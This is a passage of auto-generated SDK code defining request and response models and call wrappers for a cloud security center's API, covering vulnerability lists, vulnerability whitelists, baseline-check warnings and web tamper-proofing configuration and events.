model DescribeVulListPageResponseBody = {
  data?: [ 
    {
      cveId?: string(name='CveId'),
      extAegis?: string(name='ExtAegis'),
      id?: long(name='Id'),
      isAegis?: int32(name='IsAegis'),
      isSas?: int32(name='IsSas'),
      otherId?: string(name='OtherId'),
      releaseTime?: long(name='ReleaseTime'),
      title?: string(name='Title'),
    }
  ](name='Data'),
  requestId?: string(name='RequestId'),
  totalCount?: int32(name='TotalCount'),
}

model DescribeVulListPageResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVulListPageResponseBody(name='body'),
}

async function describeVulListPageWithOptions(request: DescribeVulListPageRequest, runtime: Util.RuntimeOptions): DescribeVulListPageResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.cveId)) {
    query['CveId'] = request.cveId;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.vulNameLike)) {
    query['VulNameLike'] = request.vulNameLike;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVulListPage',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeVulListPage(request: DescribeVulListPageRequest): DescribeVulListPageResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVulListPageWithOptions(request, runtime);
}

model DescribeVulNumStatisticsRequest {
  from?: string(name='From'),
}

model DescribeVulNumStatisticsResponseBody = {
  appCnt?: int32(name='AppCnt'),
  appNum?: int32(name='AppNum'),
  cmsDealedTotalNum?: int32(name='CmsDealedTotalNum'),
  cmsNum?: int32(name='CmsNum'),
  cveNum?: int32(name='CveNum'),
  emgNum?: int32(name='EmgNum'),
  requestId?: string(name='RequestId'),
  scaNum?: int32(name='ScaNum'),
  sysNum?: int32(name='SysNum'),
  vulAsapSum?: int32(name='VulAsapSum'),
  vulDealedTotalNum?: int32(name='VulDealedTotalNum'),
  vulLaterSum?: int32(name='VulLaterSum'),
  vulNntfSum?: int32(name='VulNntfSum'),
}

model DescribeVulNumStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVulNumStatisticsResponseBody(name='body'),
}

async function describeVulNumStatisticsWithOptions(request: DescribeVulNumStatisticsRequest, runtime: Util.RuntimeOptions): DescribeVulNumStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVulNumStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeVulNumStatistics(request: DescribeVulNumStatisticsRequest): DescribeVulNumStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVulNumStatisticsWithOptions(request, runtime);
}

model DescribeVulTargetConfigRequest {
  type?: string(name='Type'),
  uuid?: string(name='Uuid'),
}

model DescribeVulTargetConfigResponseBody = {
  requestId?: string(name='RequestId'),
  targetConfigs?: [ 
    {
      config?: string(name='Config'),
      overAllConfig?: string(name='OverAllConfig'),
      type?: string(name='Type'),
    }
  ](name='TargetConfigs'),
  totalCount?: int32(name='TotalCount'),
}

model DescribeVulTargetConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVulTargetConfigResponseBody(name='body'),
}

async function describeVulTargetConfigWithOptions(request: DescribeVulTargetConfigRequest, runtime: Util.RuntimeOptions): DescribeVulTargetConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVulTargetConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeVulTargetConfig(request: DescribeVulTargetConfigRequest): DescribeVulTargetConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVulTargetConfigWithOptions(request, runtime);
}

model DescribeVulTargetStatisticsRequest {
  type?: string(name='Type', example='cve'),
}

model DescribeVulTargetStatisticsResponseBody = {
  currentPage?: int32(name='CurrentPage', example='1'),
  pageSize?: int32(name='PageSize', example='10'),
  requestId?: string(name='RequestId', example='23AD0BD2-8771-5647-819E-6BA51E212F80'),
  targetStats?: [ 
    {
      targets?: [ 
        {
          flag?: string(name='Flag', example='add'),
          target?: string(name='Target', example='0011ea53-738c-4bff-93be-ce6a1cc9****'),
          targetType?: string(name='TargetType', example='uuid'),
        }
      ](name='Targets'),
      totalCount?: int32(name='TotalCount', example='1'),
      uuidCount?: int32(name='UuidCount', example='1'),
      vulType?: string(name='VulType', example='cve'),
    }
  ](name='TargetStats'),
  totalCount?: int32(name='TotalCount', example='1'),
}

model DescribeVulTargetStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVulTargetStatisticsResponseBody(name='body'),
}

async function describeVulTargetStatisticsWithOptions(request: DescribeVulTargetStatisticsRequest, runtime: Util.RuntimeOptions): DescribeVulTargetStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVulTargetStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeVulTargetStatistics(request: DescribeVulTargetStatisticsRequest): DescribeVulTargetStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVulTargetStatisticsWithOptions(request, runtime);
}

model DescribeVulWhitelistRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Pages start from page 1. Default value: 1.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 10.', example='10'),
}

model DescribeVulWhitelistResponseBody = {
  count?: int32(name='Count', example='2'),
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='10'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='74F97EF7-B543-43FD-A4E9-18456731F9C5'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='1'),
  vulWhitelists?: [ 
    {
      aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='RHSA-2017:3263: curl security update'),
      id?: string(name='Id', description='The ID of the rule.', example='1275'),
      name?: string(name='Name', description='The name of the vulnerability.', example='oval:com.redhat.rhsa:def:20173263'),
      reason?: string(name='Reason', description='The reason why the vulnerability is added to the whitelist.', example='ignore'),
      targetInfo?: string(name='TargetInfo', description='The application scope of the rule. The value is a JSON string that contains the following fields:

*   **type**: the type of the asset to which the rule is applied. Valid values:

       -  **Uuid**: server
       -  **GroupId**: server group

*   **groupIds**: the IDs of server groups.

*   **uuids**: the UUIDs of servers.

>  If this field is empty, the rule is applied to all assets.', example='{"type":"GroupId","groupIds":[916****],"uuids":[]}'),
      type?: string(name='Type', description='The type of the vulnerability.', example='cve'),
      whitelist?: string(name='Whitelist', example='[{
"name":"oval:com.redhat.rhsa:def:20173263",
"type":"cve",
"aliasName":"RHSA-2017:3263: curl security update"
}]'),
    }
  ](name='VulWhitelists', description='An array that consists of the whitelist of vulnerabilities.'),
}

model DescribeVulWhitelistResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVulWhitelistResponseBody(name='body'),
}

async function describeVulWhitelistWithOptions(request: DescribeVulWhitelistRequest, runtime: Util.RuntimeOptions): DescribeVulWhitelistResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVulWhitelist',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeVulWhitelist(request: DescribeVulWhitelistRequest): DescribeVulWhitelistResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVulWhitelistWithOptions(request, runtime);
}

model DescribeWarningExportInfoRequest {
  exportId?: long(name='ExportId', description='The ID of the export task.

>  You can can call the [ExportWarning](~~ExportWarning~~) operation to query the IDs of export tasks.', example='14356'),
}

model DescribeWarningExportInfoResponseBody = {
  currentCount?: int32(name='CurrentCount', description='The number of baseline entries that are exported.', example='1'),
  exportStatus?: string(name='ExportStatus', description='The status of the export task.

Valid values:

*   **init**: The task is being initialized.
*   **exporting**: The task is in progress.
*   **success**: The task is successful.', example='success'),
  fileName?: string(name='FileName', description='The name of the exported Excel file.', example='app_20210917'),
  id?: long(name='Id', description='The ID of the export task for the baseline check result.', example='131231'),
  link?: string(name='Link', description='The URL at which you can download the exported Excel file.', example='https://eds.aliyun.com/notification/entitle/64b5c3e2-e52b-4d29-9617-e7e6d74XXXX'),
  message?: string(name='Message', description='The message that shows the export task result. The value is fixed as **successful**, which indicates that the export task is successful.', example='successful'),
  progress?: int32(name='Progress', description='The progress percentage of the export task.', example='100'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='79CFF74D-E967-5407-8A78-EE03B925FDAA'),
  totalCount?: int32(name='TotalCount', description='The total number of baseline entries returned.', example='100'),
}

model DescribeWarningExportInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWarningExportInfoResponseBody(name='body'),
}

async function describeWarningExportInfoWithOptions(request: DescribeWarningExportInfoRequest, runtime: Util.RuntimeOptions): DescribeWarningExportInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.exportId)) {
    query['ExportId'] = request.exportId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeWarningExportInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeWarningExportInfo(request: DescribeWarningExportInfoRequest): DescribeWarningExportInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWarningExportInfoWithOptions(request, runtime);
}

model DescribeWarningMachinesRequest {
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.

>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of container clusters.', example='c7e3c5b420a7947c2933303144688****'),
  containerFieldName?: string(name='ContainerFieldName', description='The name of the field that is used to search for the container. Valid values:

*   **CONTAINER_ID**: the ID of the container
*   **IMAGE**: the name of the image
*   **NAMESPACE**: the namespace
*   **NODE_NAME**: the name of the node
*   **POD_IP**: the IP address of the pod
*   **HOST_IP**: the IP address of the host
*   **INSTANCE_ID**: the ID of the instance', example='containerId'),
  containerFieldValue?: string(name='ContainerFieldValue', description='The value of the field that is used to search for the container.', example='c8bb3ef0f5ccf45508f0fd1ffc200****'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  groupId?: long(name='GroupId'),
  haveRisk?: int32(name='HaveRisk', description='Specifies whether risks were detected. Valid values:

*   **1**: yes
*   **0**: no', example='1'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  machineName?: string(name='MachineName', description='The name of the server on which the baseline check is performed.', example='oracle-win-001****'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **10**.', example='10'),
  riskId?: long(name='RiskId', description='The ID of the risk item.

>  You can call the [DescribeCheckWarningSummary](~~DescribeCheckWarningSummary~~) operation to query the IDs of risk items.', example='196'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX'),
  strategyId?: long(name='StrategyId', description='The ID of the baseline check policy.', example='16'),
  targetType?: string(name='TargetType', description='The type of the query condition. Valid values:

*   **containerId**: the ID of the container
*   **uuid**: the UUID of the asset', example='uuid'),
  uuids?: string(name='Uuids', description='The UUID of the server on which the baseline check is performed. Separate multiple UUIDs with commas (,).', example='9888955c-0076-49da-bd9c-34f5492b****'),
}

model DescribeWarningMachinesResponseBody = {
  count?: int32(name='Count', description='The number of entries returned on the current page.', example='10'),
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **10**.', example='10'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='6E4CBE87-E887-5AF1-86D2-78EB4AA3E771'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='1'),
  warningMachines?: [ 
    {
      authVersion?: int32(name='AuthVersion', description='The edition of Security Center that is authorized to protect the asset. Valid values:

*   **1**: Basic edition
*   **6**: Anti-virus edition
*   **5**: Advanced edition
*   **3**: Enterprise edition
*   **7**: Ultimate edition
*   **10**: Value-added Plan edition', example='7'),
      bind?: boolean(name='Bind', description='Indicates whether Security Center is authorized to protect the asset. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
      highWarningCount?: int32(name='HighWarningCount', description='The number of **high-risk** items on the server.', example='10'),
      instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-m5ee8b9nr3h30mhb****'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='oracle-win-00****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='1.2.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='1.2.XX.XX'),
      lowWarningCount?: int32(name='LowWarningCount', description='The number of **low-risk** items on the server.', example='3'),
      mediumWarningCount?: int32(name='MediumWarningCount', description='The number of **medium-risk** items on the server.', example='2'),
      passCount?: int32(name='PassCount', description='The number of the check items that passed the baseline check on the server.', example='10'),
      portOpen?: boolean(name='PortOpen', description='Indicates whether a port on the server is accessible over the Internet. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
      regionId?: string(name='RegionId', description='The ID of the region in which the server is deployed.', example='cn-qingdao'),
      status?: int32(name='Status', description='The verification status of the risk item after the risk item is fixed. Valid values:

*   **1**: complete
*   **2**: verifying', example='1'),
      uuid?: string(name='Uuid', description='The UUID of the server on which the baseline check is performed.', example='9888955c-0076-49da-bd9c-34f5492b****'),
    }
  ](name='WarningMachines', description='An array that consists of the servers.'),
}

model DescribeWarningMachinesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWarningMachinesResponseBody(name='body'),
}

async function describeWarningMachinesWithOptions(request: DescribeWarningMachinesRequest, runtime: Util.RuntimeOptions): DescribeWarningMachinesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.containerFieldName)) {
    query['ContainerFieldName'] = request.containerFieldName;
  }
  if (!Util.isUnset(request.containerFieldValue)) {
    query['ContainerFieldValue'] = request.containerFieldValue;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.haveRisk)) {
    query['HaveRisk'] = request.haveRisk;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.machineName)) {
    query['MachineName'] = request.machineName;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.riskId)) {
    query['RiskId'] = request.riskId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.strategyId)) {
    query['StrategyId'] = request.strategyId;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeWarningMachines',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeWarningMachines(request: DescribeWarningMachinesRequest): DescribeWarningMachinesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWarningMachinesWithOptions(request, runtime);
}

model DescribeWebLockBindListRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Pages start from page 1. Default value: 1.', example='1'),
  lang?: string(name='Lang', description='The language of the content within the request and the response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20.', example='20'),
  remark?: string(name='Remark', description='The string that allows you to search for servers in fuzzy match mode. You can enter a server name or IP address.', example='192.168.XX.XX'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='116.30.XX.XX'),
  status?: string(name='Status', description='The protection status of the server that you want to query. Valid values:

*   **on**: protected
*   **off**: unprotected', example='on'),
}

model DescribeWebLockBindListResponseBody = {
  bindList?: [ 
    {
      auditCount?: string(name='AuditCount', description='The number of alerts.', example='2'),
      blockCount?: string(name='BlockCount', description='The number of blocked tampering events.', example='10'),
      dirCount?: string(name='DirCount', description='The number of protected directories.', example='5'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='testName'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='54.169.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='192.168.XX.XX'),
      os?: string(name='Os', description='The operating system that the server runs.', example='Linux'),
      percent?: int32(name='Percent', description='The starting progress percentage of web tamper proofing. Valid values: 0 to 100.', example='99'),
      serviceCode?: string(name='ServiceCode', description='The error code for web tamper proofing. Valid values:

*   **2001**: The Security Center agent is offline.
*   **9999**: The connection timed out.', example='2001'),
      serviceDetail?: string(name='ServiceDetail', description='The error message for web tamper proofing. Valid values:

*   **client offline**: The Security Center agent is offline.
*   **timeout**: The connection timed out.', example='client offline'),
      serviceStatus?: string(name='ServiceStatus', description='The status of web tamper proofing on the server. Valid values:

*   **stop**: Web tamper proofing is disabled.
*   **initializing**: Web tamper proofing is being enabled.
*   **exception**: Web tamper proofing is not running as expected.
*   **running**: Web tamper proofing is running.
*   **closing**: Web tamper proofing is being disabled.', example='stop'),
      status?: string(name='Status', description='The protection status of the server. Valid values:

*   **on**: protected
*   **off**: unprotected', example='on'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='inet-12345****'),
    }
  ](name='BindList', description='The information about the servers that have web tamper proofing enabled.'),
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page. Pages start from page 1. Default value: 1.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: 20.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D9354C1A-D709-4873-9AAE-41513327B247'),
  totalCount?: int32(name='TotalCount', description='The total number of servers that have web tamper proofing enabled.', example='11409'),
}

model DescribeWebLockBindListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebLockBindListResponseBody(name='body'),
}

async function describeWebLockBindListWithOptions(request: DescribeWebLockBindListRequest, runtime: Util.RuntimeOptions): DescribeWebLockBindListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeWebLockBindList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeWebLockBindList(request: DescribeWebLockBindListRequest): DescribeWebLockBindListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebLockBindListWithOptions(request, runtime);
}

model DescribeWebLockConfigListRequest {
  lang?: string(name='Lang', description='The language of the content within the request and the response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.3.4'),
  uuid?: string(name='Uuid', description='The UUID of the server for which you want to query the configurations.', example='inet-1234567****'),
}

model DescribeWebLockConfigListResponseBody = {
  configList?: [ 
    {
      defenceMode?: string(name='DefenceMode', description='The prevention mode. Valid values:

*   **block**: Interception Mode
*   **audit**: Alert Mode', example='audit'),
      dir?: string(name='Dir', description='The directory that has web tamper proofing enabled.', example='/www/tmp/'),
      exclusiveDir?: string(name='ExclusiveDir', description='The directory that has web tamper proofing disabled.

>  If the value of **Mode** is **blacklist**, this parameter is returned.', example='/home/admin/tomcat'),
      exclusiveFile?: string(name='ExclusiveFile', description='The file that has web tamper proofing disabled.

>  If the value of **Mode** is **blacklist**, this parameter is returned.', example='/home/admin/tomcat/localhost.log'),
      exclusiveFileType?: string(name='ExclusiveFileType', description='The type of the file that has web tamper proofing disabled.

>  If the value of **Mode** is **blacklist**, this parameter is returned.', example='*.jpg'),
      id?: string(name='Id', description='The ID of the directory that has web tamper proofing enabled.', example='11'),
      inclusiveFile?: string(name='InclusiveFile', description='The file that has web tamper proofing enabled.

>  If the value of **Mode** is **whitelist**, this parameter is returned.', example='/home/admin/tomcat/aaa.log'),
      inclusiveFileType?: string(name='InclusiveFileType', description='The type of the file that has web tamper proofing enabled.

>  If the value of **Mode** is **whitelist**, this parameter is returned.', example='jpg'),
      localBackupDir?: string(name='LocalBackupDir', description='The local path to the backup files of the protected directory.', example='/usr/local/backup'),
      mode?: string(name='Mode', description='The protection mode of web tamper proofing. Valid values:

*   **whitelist**: In this mode, web tamper proofing is enabled for the specified directories and file types.
*   **blacklist**: In this mode, web tamper proofing is enabled for the unspecified sub-directories, file types, and files in the protected directories.', example='blacklist'),
      uuid?: string(name='Uuid', description='The UUID of the server that has web tamper proofing enabled.', example='80d2f7d6-31a9-4d7f-8ff4-7ecc42f8****'),
    }
  ](name='ConfigList', description='An array that consists of the configurations of web tamper proofing.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='D9354C1A-D709-4873-9AAE-41513327B247'),
  totalCount?: int32(name='TotalCount', description='The total number of directories that have web tamper proofing enabled on the specified server.', example='1'),
}

model DescribeWebLockConfigListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebLockConfigListResponseBody(name='body'),
}

async function describeWebLockConfigListWithOptions(request: DescribeWebLockConfigListRequest, runtime: Util.RuntimeOptions): DescribeWebLockConfigListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeWebLockConfigList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeWebLockConfigList(request: DescribeWebLockConfigListRequest): DescribeWebLockConfigListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebLockConfigListWithOptions(request, runtime);
}

model DescribeWebLockExclusiveFileTypeResponseBody = {
  exclusiveFileType?: [ string ](name='ExclusiveFileType'),
  requestId?: string(name='RequestId', example='9CCD7D51-5E81-5FF5-BD74-813DDD248430'),
  totalCount?: int32(name='TotalCount', example='30'),
}

model DescribeWebLockExclusiveFileTypeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebLockExclusiveFileTypeResponseBody(name='body'),
}

async function describeWebLockExclusiveFileTypeWithOptions(runtime: Util.RuntimeOptions): DescribeWebLockExclusiveFileTypeResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeWebLockExclusiveFileType',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeWebLockExclusiveFileType(): DescribeWebLockExclusiveFileTypeResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebLockExclusiveFileTypeWithOptions(runtime);
}

model DescribeWebLockFileChangeStatisticsRequest {
  currentPage?: int32(name='CurrentPage'),
  pageSize?: int32(name='PageSize'),
}

model DescribeWebLockFileChangeStatisticsResponseBody = {
  currentPage?: int32(name='CurrentPage'),
  list?: [ 
    {
      count?: int32(name='Count'),
      file?: string(name='File'),
    }
  ](name='List'),
  pageSize?: int32(name='PageSize'),
  requestId?: string(name='RequestId'),
  totalCount?: int32(name='TotalCount'),
}

model DescribeWebLockFileChangeStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebLockFileChangeStatisticsResponseBody(name='body'),
}

async function describeWebLockFileChangeStatisticsWithOptions(request: DescribeWebLockFileChangeStatisticsRequest, runtime: Util.RuntimeOptions): DescribeWebLockFileChangeStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeWebLockFileChangeStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeWebLockFileChangeStatistics(request: DescribeWebLockFileChangeStatisticsRequest): DescribeWebLockFileChangeStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebLockFileChangeStatisticsWithOptions(request, runtime);
}

model DescribeWebLockFileEventsRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  dealed?: string(name='Dealed', description='Specifies whether the event on web tamper proofing is handled. Valid values:

*   **n**: no
*   **y**: yes', example='n'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **10**.', example='20'),
  processName?: string(name='ProcessName', description='The name of the process.', example='sys_create'),
  remark?: string(name='Remark', description='The name of the asset.

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the names of assets.', example='test-ecs'),
  tsBegin?: long(name='TsBegin', description='The beginning of the time range to query. The value is a UNIX timestamp.', example='1660649981419'),
  tsEnd?: long(name='TsEnd', description='The end of the time range to query. The value is a UNIX timestamp.', example='1660649981419'),
}

model DescribeWebLockFileEventsResponseBody = {
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='2'),
  list?: [ 
    {
      count?: long(name='Count', description='The number of attempts.', example='10'),
      ds?: long(name='Ds', description='The timestamp at which the event on web tamper proofing was first detected.', example='1657178400000'),
      eventName?: string(name='EventName', description='The name of the event on web tamper proofing.', example='modify'),
      eventStatus?: string(name='EventStatus', description='The status of the event on web tamper proofing. Valid values:

*   **1**: unhandled
*   **2**: ignored
*   **4**: deprecated
*   **8**: marked as false positive
*   **10**: added to the whitelist
*   **16**: being handled
*   **32**: defended
*   **64**: invalid
*   **128**: deleted
*   **512**: automatically handled', example='1'),
      eventType?: string(name='EventType', description='The prevention mode. Valid values:

*   **audit**: Interception Mode
*   **web_lock**: Alert Mode', example='audit'),
      gmtEvent?: long(name='GmtEvent', description='The timestamp at which the event on web tamper proofing was last detected.', example='1657178400000'),
      id?: long(name='Id', description='The ID of the event on web tamper proofing.', example='3555953980'),
